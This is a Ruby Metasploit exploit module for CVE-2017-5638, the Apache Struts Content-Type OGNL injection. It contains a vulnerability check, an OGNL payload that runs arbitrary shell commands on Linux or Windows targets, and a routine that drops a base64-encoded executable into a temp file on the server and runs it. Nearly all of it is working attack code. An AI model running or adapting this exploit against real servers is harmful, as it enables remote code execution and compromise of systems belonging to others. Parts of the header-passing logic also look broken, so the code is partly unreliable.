require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote

  include Msf::Exploit::CmdStager
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Apache Struts Content-Type code injection',
      'Description'    => %q{
          This module exploits a remote command execution vulnerability in
        Apache Struts versions < 2.5.10 when trying to handle a misconfigured content type. 
      },
      'Author'         =>
        [
          'Dave Gill', # metasploit module
	  'Nike Zheng', # vulnerability discovery
          'nmask - tengzhangchao', # original Python exploit
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', 'CVE-2017-5638'],
	  [ 'URL', 'https://cwiki.apache.org/confluence/display/WW/S2-045'],
        ],
      'Platform'      => %w{ linux win },
      'Privileged'     => true,
      'Targets'        =>
        [
          ['Linux Universal',
            {
                'Arch' => ARCH_X86,
                'Platform' => 'linux',
		'CmdStagerFlavor' => 'bourne'
            }
          ],
          ['Windows Universal',
            {
                'Arch' => ARCH_X86,
                'Platform' => 'win',
                'CmdStagerFlavor' => 'tftp'
            }
          ],
        ],
      'DisclosureDate' => 'March 2017',
      'DefaultTarget' => 0))

      register_options(
        [
          Opt::RPORT(8080),
          OptString.new('URI', [ true, 'The path to a struts application action /struts2-showcase/employee/save.action', ""]),
          OptString.new('CMD', [ false, 'Execute this command', "" ])
        ], self.class)
  end

  def send_request(payload, dataHeader: '')
    uri =   normalize_uri(datastore['URI'])
    uri =   Rex::Text::uri_encode(uri)
    headers = {'Content-Type' => payload}
    if dataHeader
      headers[@data_header] = dataHeader
    end
    resp = send_request_cgi(
      'uri'     => uri,
      'version' => '1.1',
      'method'  => 'GET',
      'headers' => {
        'Content-Type': payload
      }
    )
    resp
  end

def check
    var_a = rand_text_alpha_lower(4)
    var_b = rand_text_alpha_lower(4)
 
    payload = "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']"
    payload << ".addHeader('#{var_a}', '#{var_b}')"
    payload << "}.multipart/form-data"
 
    begin
      resp = send_request(payload)
    rescue Msf::Exploit::Failed
      return Exploit::CheckCode::Unknown
    end
 
    if resp && resp.code == 200 && resp.headers[var_a] == var_b
      Exploit::CheckCode::Vulnerable
    else
      Exploit::CheckCode::Safe
    end
end


  def execute_command(cmd, opts = {})
    payload = "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):"
    payload << "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload << "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload << "(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear())"
    payload << ".(#context.setMemberAccess(#dm)))).(#cmd='#{cmd}')."
    payload << "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))"
    payload << ".(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
    payload << "(#p=new java.lang.ProcessBuilder(#cmds))"
    payload << ".(#p.redirectErrorStream(true)).(#process=#p.start())."
    payload << "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    payload << "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
 
    print_status("Attempting to execute: #{cmd}")

    resp = send_request(payload)
    print_status("Response:#{resp.body}");
  end

def send_payload(file)

    payload = "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):"
    payload << "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload << "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload << "(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear())"
    payload << ".(#context.setMemberAccess(#dm))))."
    payload << "(#data=@org.apache.struts2.ServletActionContext@getRequest().getHeader('#{@data_header}'))."
    payload << "(#f=@java.io.File@createTempFile('#{rand_text_alpha(4)}'))."
    payload << "(#f.setExecutable(true))."
#    payload << "(#f.deleteOnExit())."
    payload << "(#fos=new java.io.FileOutputStream(#f))."

    payload << "(#d=new sun.misc.BASE64Decoder().decodeBuffer(#data))."
    payload << "(#fos.write(#d))."
    payload << "(#fos.close())."
    payload << "(#p=new java.lang.ProcessBuilder({#f.getAbsolutePath()}))."
    payload << "(#p.start())."
    payload << "(#f.delete())"

    send_request(payload, dataHeader: [file].pack("m").delete("\n"))
end



  def exploit
      print_status("Exploiting......")
      cmd = datastore['CMD']   
      if payload
          print_status("Payload set")
          send_payload(payload.encoded)
      elsif cmd
   	execute_command(datastore['CMD'])
      else      
	execute_cmdstager
      end
  end
end

